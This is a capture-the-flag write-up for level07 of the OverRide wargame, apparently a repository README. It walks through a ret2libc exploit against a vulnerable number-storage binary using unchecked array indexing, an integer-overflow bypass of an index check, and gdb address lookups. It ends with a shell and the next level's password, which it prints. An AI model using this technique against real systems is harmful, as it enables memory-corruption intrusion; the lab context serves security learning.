# level07

![level07](Ressources/title_screen07.png)

Let's start! Simple begining... open it with gdb  
Source code available [here](https://github.com/Nimpoo/override/blob/main/level07/source.c)  

```bash
level07@OverRide:~$ gdb level07 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb)
```

Okay, then run program and.. explore :

```bash
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: read 
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
Input command: quit
[Inferior 1 (process 1864) exited normally]
(gdb)
```

What happenend? I've been prompted for command with a mini-man (looks like a shell).  

The manual gives me three command:  
 - Store: I can store **any value** into the **data storage**
 - Read: I can read any **any value** from the **data storage**
 - Quit: Apparently just quit program by breaking the main loop

## What is this **"data storage"**?  

```c
unsigned char v6[400];
```

As you can see, the **data storage** is a simple bytes array with a size of 400.  
Considering it use `int` to store, and knowing that a `int` in 32bits take... 🥁🥁🥁 **32bits** !  
So, with `32 / 8 = 4` and `400 / 4 = 100`, we can deduce that the array is sized of 100 `int`s.

Only actions we can do are: `store`, `read`, `quit`.  
Ignoring `quit`, you know you can write and read with index starting from **data storage**.  
Don't care about capacity to read, but write in stack is cool.  
Some details remain.. Can I write everywhere ? Is the index verified before writing ? Is there a limit ?  

## Let's take a look to the `store` command

```c
int store_number(int *a1)
{
	unsigned int number, index;

	printf(" Number: ");
	number = get_unum();
	printf(" Index: ");
	index = get_unum();

	if (index == 3 * (index / 3) || HIBYTE(number) == 183) {
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}

	else {
		a1[index] = number;
		return 0;
	}
}
```

Okay! When you split it you get:

```c
	unsigned int number, index;

	printf(" Number: ");
	number = get_unum();
	printf(" Index: ");
	index = get_unum();
```

It takes the number to store and an index,...  

```c
	if (index == 3 * (index / 3) || HIBYTE(number) == 183) {
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}
```

...check if the index is a multiple of 3, else you are trying to write on reserved space (simple security than you can bypass using `int` overflow),...  

```c
	else {
		a1[index] = number;
		return 0;
	}
```

...and finaly write number if no error happenned.  

## Getting offset

I notice than `store_number` does not check if index is under 100 any time.  
Due to this problem, you can try to get offset from **data storage** to **return address** using **gdb**.  

When you store data, the **data storage** pointer is given to function as argument. Place a breakpoint on **store_number** or **read_number** and, when the function is called, you can read arguments from stack.  

```bash
Breakpoint 1, 0x08048729 in main ()
(gdb) print $ebp+4
$1 = (void *) 0xffffd71c
(gdb)
```

```bash
Breakpoint 2, 0x08048636 in store_number ()
(gdb) x/a $ebp+8
0xffffd530:	0xffffd554
(gdb)
```

First, I read address where the **retrun adress** of main is stored.  
Secondly, I read first argument of the **store_number** function.  
Then, substract them: `0xffffd71c - 0xffffd554 = 0x1c8 = 456`.  
Because of you are writting in `int`s, you have to divide by 4 (e.g. size of `int`), so offset is `114`.  

```bash
Input command: store
 Number: 42424242
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

Apparently, `114` is a multiple of 3. Remember what I said on this weird security, you can easily bypass it using `int` overflow.  
`0xffffffff` is the maximum value that a 4-bytes `int` can store.  
Add 1 to enable **overflow** and add your wanted value in, `456`. It gives `0x1000001c8`. Divide it by 4 because of the code will multiply it back after, `0x40000072` or `1073741938`.  

## Ret2LibC

We did not take the time to think about which value to store as return address.

We will try to `ret2libc`, so we need to put `system` address and `/bin/sh` as argument.  

```bash
(gdb) print system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
process 1839
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```

Here, I got needed addresses, just convert it to decimal and system address become `4159090384` and `/bin/sh` address become `4160264172`.  

Let's try with all of theses new values:

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$
```

![](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fmedia.tenor.com%2FrMw-q6l2qEwAAAAM%2Fceloma-chokbar.gif&f=1&nofb=1&ipt=2cf0c72246404eff96823e775ed48b373352580333a791be226ba8ba1c72e336&ipo=images)
# LET'S GOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
![](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fmedia1.tenor.com%2Fimages%2Ffe2f3ea1aa70a8baa65b93f2468f42f0%2Ftenor.gif%3Fitemid%3D16819858&f=1&nofb=1&ipt=6384f8322d419e6c7f8b1d473e803cc94e957b7a2b956383478b016bc2322d41&ipo=images)

### Go get pass and switch to level08

```bash
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```
